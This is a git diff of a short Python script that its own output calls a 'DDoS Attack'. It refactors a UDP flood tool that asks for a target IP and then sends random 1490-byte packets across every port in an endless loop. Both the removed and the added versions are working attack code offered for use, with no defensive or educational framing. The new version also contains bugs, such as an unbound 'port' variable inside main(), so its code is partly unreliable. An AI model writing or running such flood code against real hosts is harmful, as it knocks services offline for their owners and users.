@@ -1,16 +1,28 @@
-import socket, random
+# author: Xnork
+# data: 18/11/2022
 
-IP, port = input("IP Target: "), int(input("Port: "))
+import random
+from Socket import Socket
 
-socket_server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-random_bytes = random._urandom(1490)
+IP_TARGET, port \
+    = input('IP Target: '), \
+      input('Initial port: ') or 90
 
-print("DDoS Attack is running...\nCTRL-C to exit.")
-while True:
-    try:
-        socket_server.sendto(random_bytes, (IP, port))
-        port = port + 1 if port < 65534 else 1
-    except:
-        print("\n<LOG>: DDoS attack is finished.")
-        socket_server.close()
-        break
+assert len(IP_TARGET) > 0
+
+target = Socket(IP_TARGET)
+BYTES = random._urandom(1490)
+
+def main():
+    print('DDoS Attack is working...')
+    while True:
+        try:
+            target.send_to(port, BYTES)
+            port = port + 1 if port < 65534 else 1
+        except:
+            print('\nDDoS Attack has closed.')
+            target.close()
+            break
+
+if __name__ == '__main__':
+    main()
